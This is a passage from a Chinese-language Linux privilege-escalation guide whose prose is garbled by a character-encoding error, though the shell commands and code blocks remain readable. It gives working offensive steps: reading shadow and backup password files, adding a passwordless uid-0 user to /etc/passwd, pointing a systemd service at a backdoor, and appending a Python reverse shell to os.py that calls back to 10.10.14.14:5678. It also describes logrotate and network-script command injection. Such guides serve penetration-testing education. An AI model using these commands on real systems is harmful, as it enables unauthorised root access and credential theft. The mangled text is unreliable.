æ­¤æ¼æ´æ˜¯åœ¨è¿™äº›æ“ä½œç³»ç»Ÿä¸­åˆ›å»ºæ–° ssh å¯†é’¥æ—¶é€ æˆçš„ï¼Œå› ä¸º <strong>ä»…å¯èƒ½æœ‰ 32,768 ç§å˜ä½“</strong>ã€‚è¿™æ„å‘³ç€æ‰€æœ‰å¯èƒ½æ€§éƒ½å¯ä»¥è®¡ç®—ï¼Œå¹¶ä¸” <strong>æ‹¥æœ‰ ssh å…¬é’¥åï¼Œæ‚¨å¯ä»¥æœç´¢ç›¸åº”çš„ç§é’¥</strong>ã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°è®¡ç®—å‡ºçš„å¯èƒ½æ€§ï¼š<a href="https://github.com/g0tmi1k/debian-ssh">https://github.com/g0tmi1k/debian-ssh</a></p>
<h3 id="ssh-æœ‰è¶£çš„é…ç½®å€¼"><a class="header" href="#ssh-æœ‰è¶£çš„é…ç½®å€¼">SSH æœ‰è¶£çš„é…ç½®å€¼</a></h3>
<ul>
<li><strong>PasswordAuthentication:</strong> æŒ‡å®šæ˜¯å¦å…è®¸å¯†ç è®¤è¯ã€‚é»˜è®¤å€¼ä¸º <code>no</code>ã€‚</li>
<li><strong>PubkeyAuthentication:</strong> æŒ‡å®šæ˜¯å¦å…è®¸å…¬é’¥è®¤è¯ã€‚é»˜è®¤å€¼ä¸º <code>yes</code>ã€‚</li>
<li><strong>PermitEmptyPasswords</strong>: å½“å…è®¸å¯†ç è®¤è¯æ—¶ï¼ŒæŒ‡å®šæœåŠ¡å™¨æ˜¯å¦å…è®¸ä½¿ç”¨ç©ºå¯†ç å­—ç¬¦ä¸²ç™»å½•è´¦æˆ·ã€‚é»˜è®¤å€¼ä¸º <code>no</code>ã€‚</li>
</ul>
<h3 id="permitrootlogin"><a class="header" href="#permitrootlogin">PermitRootLogin</a></h3>
<p>æŒ‡å®š root æ˜¯å¦å¯ä»¥ä½¿ç”¨ ssh ç™»å½•ï¼Œé»˜è®¤å€¼ä¸º <code>no</code>ã€‚å¯èƒ½çš„å€¼ï¼š</p>
<ul>
<li><code>yes</code>: root å¯ä»¥ä½¿ç”¨å¯†ç å’Œç§é’¥ç™»å½•</li>
<li><code>without-password</code> æˆ– <code>prohibit-password</code>: root åªèƒ½ä½¿ç”¨ç§é’¥ç™»å½•</li>
<li><code>forced-commands-only</code>: root åªèƒ½ä½¿ç”¨ç§é’¥ç™»å½•ï¼Œå¹¶ä¸”å¦‚æœæŒ‡å®šäº†å‘½ä»¤é€‰é¡¹</li>
<li><code>no</code> : ä¸å…è®¸</li>
</ul>
<h3 id="authorizedkeysfile"><a class="header" href="#authorizedkeysfile">AuthorizedKeysFile</a></h3>
<p>æŒ‡å®šåŒ…å«å¯ç”¨äºç”¨æˆ·è®¤è¯çš„å…¬é’¥çš„æ–‡ä»¶ã€‚å®ƒå¯ä»¥åŒ…å«åƒ <code>%h</code> è¿™æ ·çš„æ ‡è®°ï¼Œè¿™å°†è¢«ä¸»ç›®å½•æ›¿æ¢ã€‚<strong>æ‚¨å¯ä»¥æŒ‡ç¤ºç»å¯¹è·¯å¾„</strong>ï¼ˆä»¥ <code>/</code> å¼€å¤´ï¼‰æˆ– <strong>ç›¸å¯¹äºç”¨æˆ·ä¸»ç›®å½•çš„ç›¸å¯¹è·¯å¾„</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="language-bash">AuthorizedKeysFile    .ssh/authorized_keys access
</code></pre>
<p>è¯¥é…ç½®å°†æŒ‡ç¤ºï¼Œå¦‚æœæ‚¨å°è¯•ä½¿ç”¨ç”¨æˆ·â€œ<strong>testusername</strong>â€çš„<strong>ç§é’¥</strong>ç™»å½•ï¼Œsshå°†æ¯”è¾ƒæ‚¨çš„å¯†é’¥çš„å…¬é’¥ä¸ä½äº<code>/home/testusername/.ssh/authorized_keys</code>å’Œ<code>/home/testusername/access</code>ä¸­çš„å…¬é’¥ã€‚</p>
<h3 id="forwardagentallowagentforwarding"><a class="header" href="#forwardagentallowagentforwarding">ForwardAgent/AllowAgentForwarding</a></h3>
<p>SSHä»£ç†è½¬å‘å…è®¸æ‚¨<strong>ä½¿ç”¨æœ¬åœ°SSHå¯†é’¥ï¼Œè€Œä¸æ˜¯å°†å¯†é’¥</strong>ï¼ˆæ²¡æœ‰å¯†ç çŸ­è¯­ï¼ï¼‰æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚å› æ­¤ï¼Œæ‚¨å°†èƒ½å¤Ÿ<strong>é€šè¿‡sshè·³è½¬</strong>åˆ°ä¸€ä¸ªä¸»æœºï¼Œç„¶åä»é‚£é‡Œ<strong>è·³è½¬åˆ°å¦ä¸€ä¸ª</strong>ä¸»æœºï¼Œ<strong>ä½¿ç”¨</strong>ä½äºæ‚¨<strong>åˆå§‹ä¸»æœº</strong>ä¸­çš„<strong>å¯†é’¥</strong>ã€‚</p>
<p>æ‚¨éœ€è¦åœ¨<code>$HOME/.ssh.config</code>ä¸­è®¾ç½®æ­¤é€‰é¡¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code>Host example.com
ForwardAgent yes
</code></pre>
<p>æ³¨æ„ï¼Œå¦‚æœ <code>Host</code> æ˜¯ <code>*</code>ï¼Œæ¯å½“ç”¨æˆ·è·³è½¬åˆ°ä¸åŒçš„æœºå™¨æ—¶ï¼Œè¯¥ä¸»æœºå°†èƒ½å¤Ÿè®¿é—®å¯†é’¥ï¼ˆè¿™æ˜¯ä¸€ç§å®‰å…¨é—®é¢˜ï¼‰ã€‚</p>
<p>æ–‡ä»¶ <code>/etc/ssh_config</code> å¯ä»¥ <strong>è¦†ç›–</strong> è¿™äº› <strong>é€‰é¡¹</strong> å¹¶å…è®¸æˆ–æ‹’ç»æ­¤é…ç½®ã€‚<br />
æ–‡ä»¶ <code>/etc/sshd_config</code> å¯ä»¥ä½¿ç”¨å…³é”®å­— <code>AllowAgentForwarding</code> <strong>å…è®¸</strong> æˆ– <strong>æ‹’ç»</strong> ssh-agent è½¬å‘ï¼ˆé»˜è®¤æ˜¯å…è®¸ï¼‰ã€‚</p>
<p>å¦‚æœä½ å‘ç°åœ¨æŸä¸ªç¯å¢ƒä¸­é…ç½®äº† Forward Agentï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼Œå› ä¸º <strong>ä½ å¯èƒ½èƒ½å¤Ÿåˆ©ç”¨å®ƒæ¥æå‡æƒé™</strong>ï¼š</p>
<p>{% content-ref url="ssh-forward-agent-exploitation.md" %}
<a href="ssh-forward-agent-exploitation.html">ssh-forward-agent-exploitation.md</a>
{% endcontent-ref %}</p>
<h2 id="æœ‰è¶£çš„æ–‡ä»¶"><a class="header" href="#æœ‰è¶£çš„æ–‡ä»¶">æœ‰è¶£çš„æ–‡ä»¶</a></h2>
<h3 id="é…ç½®æ–‡ä»¶"><a class="header" href="#é…ç½®æ–‡ä»¶">é…ç½®æ–‡ä»¶</a></h3>
<p>æ–‡ä»¶ <code>/etc/profile</code> å’Œ <code>/etc/profile.d/</code> ä¸‹çš„æ–‡ä»¶æ˜¯ <strong>å½“ç”¨æˆ·è¿è¡Œæ–° shell æ—¶æ‰§è¡Œçš„è„šæœ¬</strong>ã€‚å› æ­¤ï¼Œå¦‚æœä½ å¯ä»¥ <strong>å†™å…¥æˆ–ä¿®æ”¹å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥æå‡æƒé™</strong>ã€‚</p>
<pre><code class="language-bash">ls -l /etc/profile /etc/profile.d/
</code></pre>
<p>å¦‚æœå‘ç°ä»»ä½•å¥‡æ€ªçš„é…ç½®æ–‡ä»¶è„šæœ¬ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥å…¶ä¸­æ˜¯å¦åŒ…å«<strong>æ•æ„Ÿä¿¡æ¯</strong>ã€‚</p>
<h3 id="passwdshadow-æ–‡ä»¶"><a class="header" href="#passwdshadow-æ–‡ä»¶">Passwd/Shadow æ–‡ä»¶</a></h3>
<p>æ ¹æ®æ“ä½œç³»ç»Ÿçš„ä¸åŒï¼Œ<code>/etc/passwd</code> å’Œ <code>/etc/shadow</code> æ–‡ä»¶å¯èƒ½ä½¿ç”¨ä¸åŒçš„åç§°ï¼Œæˆ–è€…å¯èƒ½å­˜åœ¨å¤‡ä»½ã€‚å› æ­¤ï¼Œå»ºè®®<strong>æ‰¾åˆ°æ‰€æœ‰è¿™äº›æ–‡ä»¶</strong>å¹¶<strong>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥è¯»å–</strong>å®ƒä»¬ï¼Œä»¥æŸ¥çœ‹<strong>æ–‡ä»¶ä¸­æ˜¯å¦åŒ…å«å“ˆå¸Œ</strong>ï¼š</p>
<pre><code class="language-bash">#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2&gt;/dev/null
</code></pre>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åœ¨ <code>/etc/passwd</code>ï¼ˆæˆ–ç­‰æ•ˆï¼‰æ–‡ä»¶ä¸­æ‰¾åˆ° <strong>å¯†ç å“ˆå¸Œ</strong>ã€‚</p>
<pre><code class="language-bash">grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null
</code></pre>
<h3 id="å¯å†™çš„-etcpasswd"><a class="header" href="#å¯å†™çš„-etcpasswd">å¯å†™çš„ /etc/passwd</a></h3>
<p>é¦–å…ˆï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¹‹ä¸€ç”Ÿæˆå¯†ç ã€‚</p>
<pre><code>openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
</code></pre>
<p>ç„¶åæ·»åŠ ç”¨æˆ· <code>hacker</code> å¹¶æ·»åŠ ç”Ÿæˆçš„å¯†ç ã€‚</p>
<pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
</code></pre>
<p>ä¾‹å¦‚: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
<p>æ‚¨ç°åœ¨å¯ä»¥ä½¿ç”¨ <code>su</code> å‘½ä»¤ä¸ <code>hacker:hacker</code></p>
<p>æˆ–è€…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡Œæ·»åŠ ä¸€ä¸ªæ²¡æœ‰å¯†ç çš„è™šæ‹Ÿç”¨æˆ·ã€‚<br />
è­¦å‘Šï¼šè¿™å¯èƒ½ä¼šé™ä½æœºå™¨çš„å½“å‰å®‰å…¨æ€§ã€‚</p>
<pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
su - dummy
</code></pre>
<p>æ³¨æ„ï¼šåœ¨BSDå¹³å°ä¸Šï¼Œ<code>/etc/passwd</code>ä½äº<code>/etc/pwd.db</code>å’Œ<code>/etc/master.passwd</code>ï¼ŒåŒæ—¶<code>/etc/shadow</code>è¢«é‡å‘½åä¸º<code>/etc/spwd.db</code>ã€‚</p>
<p>æ‚¨åº”è¯¥æ£€æŸ¥æ˜¯å¦å¯ä»¥<strong>å†™å…¥ä¸€äº›æ•æ„Ÿæ–‡ä»¶</strong>ã€‚ä¾‹å¦‚ï¼Œæ‚¨èƒ½å¦å†™å…¥æŸäº›<strong>æœåŠ¡é…ç½®æ–‡ä»¶</strong>ï¼Ÿ</p>
<pre><code class="language-bash">find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
</code></pre>
<p>ä¾‹å¦‚ï¼Œå¦‚æœæœºå™¨æ­£åœ¨è¿è¡Œ <strong>tomcat</strong> æœåŠ¡å™¨ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥ <strong>ä¿®æ”¹ /etc/systemd/ ä¸­çš„ Tomcat æœåŠ¡é…ç½®æ–‡ä»¶ï¼Œ</strong> é‚£ä¹ˆæ‚¨å¯ä»¥ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š</p>
<pre><code>ExecStart=/path/to/backdoor
User=root
Group=root
</code></pre>
<p>æ‚¨çš„åé—¨å°†åœ¨ä¸‹æ¬¡å¯åŠ¨ tomcat æ—¶æ‰§è¡Œã€‚</p>
<h3 id="æ£€æŸ¥æ–‡ä»¶å¤¹"><a class="header" href="#æ£€æŸ¥æ–‡ä»¶å¤¹">æ£€æŸ¥æ–‡ä»¶å¤¹</a></h3>
<p>ä»¥ä¸‹æ–‡ä»¶å¤¹å¯èƒ½åŒ…å«å¤‡ä»½æˆ–æœ‰è¶£çš„ä¿¡æ¯ï¼š<strong>/tmp</strong>, <strong>/var/tmp</strong>, <strong>/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root</strong>ï¼ˆæ‚¨å¯èƒ½æ— æ³•è¯»å–æœ€åä¸€ä¸ªï¼Œä½†å¯ä»¥å°è¯•ï¼‰</p>
<pre><code class="language-bash">ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
</code></pre>
<h3 id="å¥‡æ€ªçš„ä½ç½®æ‹¥æœ‰çš„æ–‡ä»¶"><a class="header" href="#å¥‡æ€ªçš„ä½ç½®æ‹¥æœ‰çš„æ–‡ä»¶">å¥‡æ€ªçš„ä½ç½®/æ‹¥æœ‰çš„æ–‡ä»¶</a></h3>
<pre><code class="language-bash">#root owned files in /home folders
find /home -user root 2&gt;/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2&gt;/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2&gt;/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2&gt;/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2&gt;/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2&gt;/dev/null
done
done
</code></pre>
<h3 id="æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶"><a class="header" href="#æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶">æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶</a></h3>
<pre><code class="language-bash">find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2&gt;/dev/null
</code></pre>
<h3 id="sqlite-æ•°æ®åº“æ–‡ä»¶"><a class="header" href="#sqlite-æ•°æ®åº“æ–‡ä»¶">Sqlite æ•°æ®åº“æ–‡ä»¶</a></h3>
<pre><code class="language-bash">find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2&gt;/dev/null
</code></pre>
<h3 id="_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-æ–‡ä»¶"><a class="header" href="#_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-æ–‡ä»¶">*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml æ–‡ä»¶</a></h3>
<pre><code class="language-bash">find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2&gt;/dev/null
</code></pre>
<h3 id="éšè—æ–‡ä»¶"><a class="header" href="#éšè—æ–‡ä»¶">éšè—æ–‡ä»¶</a></h3>
<pre><code class="language-bash">find / -type f -iname ".*" -ls 2&gt;/dev/null
</code></pre>
<h3 id="è„šæœ¬äºŒè¿›åˆ¶æ–‡ä»¶åœ¨-path-ä¸­"><a class="header" href="#è„šæœ¬äºŒè¿›åˆ¶æ–‡ä»¶åœ¨-path-ä¸­"><strong>è„šæœ¬/äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ PATH ä¸­</strong></a></h3>
<pre><code class="language-bash">for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2&gt;/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2&gt;/dev/null; done
</code></pre>
<h3 id="ç½‘é¡µæ–‡ä»¶"><a class="header" href="#ç½‘é¡µæ–‡ä»¶"><strong>ç½‘é¡µæ–‡ä»¶</strong></a></h3>
<pre><code class="language-bash">ls -alhR /var/www/ 2&gt;/dev/null
ls -alhR /srv/www/htdocs/ 2&gt;/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2&gt;/dev/null
</code></pre>
<h3 id="å¤‡ä»½"><a class="header" href="#å¤‡ä»½"><strong>å¤‡ä»½</strong></a></h3>
<pre><code class="language-bash">find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2&gt;/dev/null
</code></pre>
<h3 id="å·²çŸ¥åŒ…å«å¯†ç çš„æ–‡ä»¶"><a class="header" href="#å·²çŸ¥åŒ…å«å¯†ç çš„æ–‡ä»¶">å·²çŸ¥åŒ…å«å¯†ç çš„æ–‡ä»¶</a></h3>
<p>é˜…è¯»<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><strong>linPEAS</strong></a>çš„ä»£ç ï¼Œå®ƒä¼šæœç´¢<strong>å¯èƒ½åŒ…å«å¯†ç çš„å¤šä¸ªæ–‡ä»¶</strong>ã€‚<br />
<strong>å¦ä¸€ä¸ªæœ‰è¶£çš„å·¥å…·</strong>æ˜¯ï¼š<a href="https://github.com/AlessandroZ/LaZagne"><strong>LaZagne</strong></a>ï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€æºåº”ç”¨ç¨‹åºï¼Œç”¨äºæ£€ç´¢å­˜å‚¨åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šçš„å¤§é‡å¯†ç ï¼Œé€‚ç”¨äºWindowsã€Linuxå’ŒMacã€‚</p>
<h3 id="æ—¥å¿—"><a class="header" href="#æ—¥å¿—">æ—¥å¿—</a></h3>
<p>å¦‚æœæ‚¨å¯ä»¥è¯»å–æ—¥å¿—ï¼Œæ‚¨å¯èƒ½ä¼šåœ¨å…¶ä¸­æ‰¾åˆ°<strong>æœ‰è¶£/æœºå¯†çš„ä¿¡æ¯</strong>ã€‚æ—¥å¿—è¶Šå¥‡æ€ªï¼Œå¯èƒ½å°±è¶Šæœ‰è¶£ã€‚<br />
æ­¤å¤–ï¼Œä¸€äº›â€œ<strong>ä¸è‰¯</strong>â€é…ç½®ï¼ˆåé—¨ï¼Ÿï¼‰çš„<strong>å®¡è®¡æ—¥å¿—</strong>å¯èƒ½å…è®¸æ‚¨<strong>åœ¨å®¡è®¡æ—¥å¿—ä¸­è®°å½•å¯†ç </strong>ï¼Œæ­£å¦‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰€è§£é‡Šçš„ï¼š<a href="https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/">https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/</a>ã€‚</p>
<pre><code class="language-bash">aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&amp;${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2&gt;/dev/null
</code></pre>
<p>ä¸ºäº†<strong>è¯»å–æ—¥å¿—ï¼Œç»„</strong> <a href="interesting-groups-linux-pe/#adm-group"><strong>adm</strong></a> å°†éå¸¸æœ‰ç”¨ã€‚</p>
<h3 id="shell-æ–‡ä»¶"><a class="header" href="#shell-æ–‡ä»¶">Shell æ–‡ä»¶</a></h3>
<pre><code class="language-bash">~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
</code></pre>
<h3 id="é€šç”¨å‡­æ®æœç´¢æ­£åˆ™è¡¨è¾¾å¼"><a class="header" href="#é€šç”¨å‡­æ®æœç´¢æ­£åˆ™è¡¨è¾¾å¼">é€šç”¨å‡­æ®æœç´¢/æ­£åˆ™è¡¨è¾¾å¼</a></h3>
<p>æ‚¨è¿˜åº”è¯¥æ£€æŸ¥æ–‡ä»¶åä¸­æˆ–å†…å®¹ä¸­åŒ…å«â€œ<strong>password</strong>â€ä¸€è¯çš„æ–‡ä»¶ï¼Œå¹¶æ£€æŸ¥æ—¥å¿—ä¸­çš„IPå’Œç”µå­é‚®ä»¶ï¼Œæˆ–å“ˆå¸Œæ­£åˆ™è¡¨è¾¾å¼ã€‚<br />
æˆ‘ä¸ä¼šåœ¨è¿™é‡Œåˆ—å‡ºå¦‚ä½•åšåˆ°è¿™ä¸€åˆ‡ï¼Œä½†å¦‚æœæ‚¨æ„Ÿå…´è¶£ï¼Œå¯ä»¥æŸ¥çœ‹<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh"><strong>linpeas</strong></a>æ‰§è¡Œçš„æœ€åæ£€æŸ¥ã€‚</p>
<h2 id="å¯å†™æ–‡ä»¶"><a class="header" href="#å¯å†™æ–‡ä»¶">å¯å†™æ–‡ä»¶</a></h2>
<h3 id="pythonåº“åŠ«æŒ"><a class="header" href="#pythonåº“åŠ«æŒ">Pythonåº“åŠ«æŒ</a></h3>
<p>å¦‚æœæ‚¨çŸ¥é“<strong>ä»å“ªé‡Œ</strong>å°†è¦æ‰§è¡Œpythonè„šæœ¬ï¼Œå¹¶ä¸”æ‚¨<strong>å¯ä»¥åœ¨</strong>è¯¥æ–‡ä»¶å¤¹ä¸­å†™å…¥æˆ–<strong>å¯ä»¥ä¿®æ”¹pythonåº“</strong>ï¼Œæ‚¨å¯ä»¥ä¿®æ”¹OSåº“å¹¶è¿›è¡Œåé—¨ï¼ˆå¦‚æœæ‚¨å¯ä»¥å†™å…¥pythonè„šæœ¬å°†è¦æ‰§è¡Œçš„ä½ç½®ï¼Œè¯·å¤åˆ¶å¹¶ç²˜è´´os.pyåº“ï¼‰ã€‚</p>
<p>è¦<strong>å¯¹åº“è¿›è¡Œåé—¨</strong>ï¼Œåªéœ€åœ¨os.pyåº“çš„æœ«å°¾æ·»åŠ ä»¥ä¸‹è¡Œï¼ˆæ›´æ”¹IPå’Œç«¯å£ï¼‰ï¼š</p>
<pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
</code></pre>
<h3 id="logrotate-åˆ©ç”¨"><a class="header" href="#logrotate-åˆ©ç”¨">Logrotate åˆ©ç”¨</a></h3>
<p><code>logrotate</code> ä¸­çš„ä¸€ä¸ªæ¼æ´å…è®¸å¯¹æ—¥å¿—æ–‡ä»¶æˆ–å…¶çˆ¶ç›®å½•å…·æœ‰ <strong>å†™æƒé™</strong> çš„ç”¨æˆ·æ½œåœ¨åœ°è·å¾—æå‡çš„æƒé™ã€‚è¿™æ˜¯å› ä¸º <code>logrotate</code> é€šå¸¸ä»¥ <strong>root</strong> èº«ä»½è¿è¡Œï¼Œå¯ä»¥è¢«æ“æ§ä»¥æ‰§è¡Œä»»æ„æ–‡ä»¶ï¼Œç‰¹åˆ«æ˜¯åœ¨åƒ <em><strong>/etc/bash_completion.d/</strong></em> è¿™æ ·çš„ç›®å½•ä¸­ã€‚æ£€æŸ¥æƒé™æ—¶ï¼Œä¸ä»…è¦åœ¨ <em>/var/log</em> ä¸­æ£€æŸ¥ï¼Œè¿˜è¦åœ¨åº”ç”¨æ—¥å¿—è½®æ¢çš„ä»»ä½•ç›®å½•ä¸­æ£€æŸ¥ã€‚</p>
<p>{% hint style="info" %}
æ­¤æ¼æ´å½±å“ <code>logrotate</code> ç‰ˆæœ¬ <code>3.18.0</code> åŠæ›´æ—©ç‰ˆæœ¬
{% endhint %}</p>
<p>æœ‰å…³è¯¥æ¼æ´çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®æ­¤é¡µé¢ï¼š<a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</a>ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/whotwagner/logrotten"><strong>logrotten</strong></a> åˆ©ç”¨æ­¤æ¼æ´ã€‚</p>
<p>æ­¤æ¼æ´ä¸ <a href="https://www.cvedetails.com/cve/CVE-2016-1247/"><strong>CVE-2016-1247</strong></a> <strong>ï¼ˆnginx æ—¥å¿—ï¼‰</strong> éå¸¸ç›¸ä¼¼ï¼Œå› æ­¤æ¯å½“æ‚¨å‘ç°å¯ä»¥æ›´æ”¹æ—¥å¿—æ—¶ï¼Œè¯·æ£€æŸ¥è°åœ¨ç®¡ç†è¿™äº›æ—¥å¿—ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥æå‡æƒé™ã€‚</p>
<h3 id="etcsysconfignetwork-scripts-centosredhat"><a class="header" href="#etcsysconfignetwork-scripts-centosredhat">/etc/sysconfig/network-scripts/ (Centos/Redhat)</a></h3>
<p><strong>æ¼æ´å‚è€ƒï¼š</strong> <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f"><strong>https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</strong></a></p>
<p>å¦‚æœå‡ºäºæŸç§åŸå› ï¼Œç”¨æˆ·èƒ½å¤Ÿ <strong>å†™å…¥</strong> ä¸€ä¸ª <code>ifcf-&lt;whatever&gt;</code> è„šæœ¬åˆ° <em>/etc/sysconfig/network-scripts</em> <strong>æˆ–</strong> èƒ½å¤Ÿ <strong>è°ƒæ•´</strong> ä¸€ä¸ªç°æœ‰çš„è„šæœ¬ï¼Œé‚£ä¹ˆæ‚¨çš„ <strong>ç³»ç»Ÿå·²è¢«æ”»é™·</strong>ã€‚</p>
<p>ç½‘ç»œè„šæœ¬ï¼Œä¾‹å¦‚ <em>ifcg-eth0</em> ç”¨äºç½‘ç»œè¿æ¥ã€‚å®ƒä»¬çœ‹èµ·æ¥ä¸ .INI æ–‡ä»¶å®Œå…¨ç›¸åŒã€‚ç„¶è€Œï¼Œå®ƒä»¬åœ¨ Linux ä¸Šç”±ç½‘ç»œç®¡ç†å™¨ï¼ˆdispatcher.dï¼‰<del>sourced</del>ã€‚</p>
<p>åœ¨æˆ‘çš„æ¡ˆä¾‹ä¸­ï¼Œè¿™äº›ç½‘ç»œè„šæœ¬ä¸­çš„ <code>NAME=</code> å±æ€§å¤„ç†ä¸å½“ã€‚å¦‚æœæ‚¨åœ¨åç§°ä¸­æœ‰ <strong>ç©ºæ ¼</strong>ï¼Œç³»ç»Ÿä¼šå°è¯•æ‰§è¡Œç©ºæ ¼åçš„éƒ¨åˆ†ã€‚è¿™æ„å‘³ç€ <strong>ç¬¬ä¸€ä¸ªç©ºæ ¼åçš„æ‰€æœ‰å†…å®¹éƒ½ä»¥ root èº«ä»½æ‰§è¡Œ</strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼š <em>/etc/sysconfig/network-scripts/ifcfg-1337</em></p>
<pre><code class="language-bash">NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
</code></pre>
<h3 id="init-initd-systemd-å’Œ-rcd"><a class="header" href="#init-initd-systemd-å’Œ-rcd"><strong>init, init.d, systemd å’Œ rc.d</strong></a></h3>
